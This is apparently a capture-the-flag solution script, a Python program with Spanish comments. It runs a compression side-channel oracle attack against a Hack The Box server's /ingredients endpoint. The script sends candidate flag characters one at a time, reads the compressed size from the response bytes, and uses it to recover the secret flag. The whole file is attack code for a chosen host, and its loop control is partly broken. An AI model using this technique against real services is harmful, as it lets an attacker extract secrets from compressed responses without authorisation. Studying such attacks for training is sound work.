#!/usr/bin/python3

import string
import requests
import sys
import json

# Verificar si se proporciona un argumento en la línea de comandos
if len(sys.argv) != 2:
    print("Uso: python3 script.py <HOST>")
    sys.exit(1)

charmap = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&*+,-./:<=>@[\]^_`}"
debug = 1
HOST = sys.argv[1]
FLAG = "Secret: HTB{"
high_score = '3c00'
last_score = '3c00'
url = 'http://' + HOST + '/ingredients'
headers = {'content-type': 'application/json'}
myobj = {'ingredients': FLAG}
compressed_size = ''

print("Estableciendo valores iniciales... Llamando al servidor zip basado en la bandera = \"Secret: HTB{\"")
response = requests.post(url, data=json.dumps(myobj), headers=headers)
if response.ok == 1:
    print("Respuesta HTTP exitosa!")
    for i in range(36, 40):
        compressed_size += response.content.hex()[i]
    last_score = compressed_size
    high_score = compressed_size
    if debug:
        print("El tamaño comprimido actual es", compressed_size)
        print("Enumerando caracteres e iterando...")

flag_search = True
letter_search = True

while flag_search:
    while True:
        for letter in charmap:
            compressed_size = ''
            myobj = {'ingredients': FLAG + letter}
            if debug:
                print("Verificando letra:", letter)
                print("Mi objeto = ", myobj)
            response = requests.post(url, data=json.dumps(myobj), headers=headers)
            if response.ok == 1:
                print("RESPUESTA HTTP OK")
            for i in range(36, 40):
                compressed_size += response.content.hex()[i]
            if debug:
                print("El tamaño comprimido es", compressed_size)
                print("La puntuación más alta es", high_score)
                print("La puntuación más baja es", last_score)
                print(response.content.hex())
            if compressed_size < high_score:
                print("Error, el tamaño comprimido de alguna manera se está haciendo más pequeño a pesar de agregar datos")
                break
            if compressed_size == high_score:
                last_score = compressed_size
                FLAG = FLAG + letter
                if debug:
                    print("El tamaño comprimido superó high_score, pero se agregó una letra de puntuación más baja,", letter,
                          "al búfer de la bandera")
                letter_search = False
            if (compressed_size > high_score) & (compressed_size > last_score):
                last_score = compressed_size
        else:
            letter_search = ''
